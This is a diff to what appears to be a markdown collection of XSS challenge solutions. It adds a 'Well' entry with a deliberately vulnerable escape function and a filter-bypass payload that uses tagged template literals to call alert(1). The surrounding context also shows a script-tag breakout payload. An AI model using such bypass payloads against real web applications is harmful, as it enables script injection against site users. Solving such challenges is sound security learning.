@@ -10,6 +10,7 @@
 - [DOM](#dom)
 - [Skandia](#skandia)
 - [JSON2](#json2)
+- [Well](#well)
 
 ## Warmup
 
@@ -143,4 +144,23 @@ function escape(s) {
 
 ```
 </scrip</scriptt><script>alert(1)//
+```
+
+## Well
+
+- Task
+
+```
+function escape(s) {
+  http://www.avlidienbrunn.se/xsschallenge/
+
+  s = s.replace(/[\r\n\u2028\u2029\\;,()\[\]<]/g, '');
+  return "<script> var email = '" + s + "'; <\/script>";
+}
+```
+
+- Solution
+
+```
+'+Function`a${`alert${Function`a${`return fromCharCode`}{fromCharCode}``${String}``40`}1${Function`a${`return fromCharCode`}{fromCharCode}``${String}``41`}`}```+'
 ```
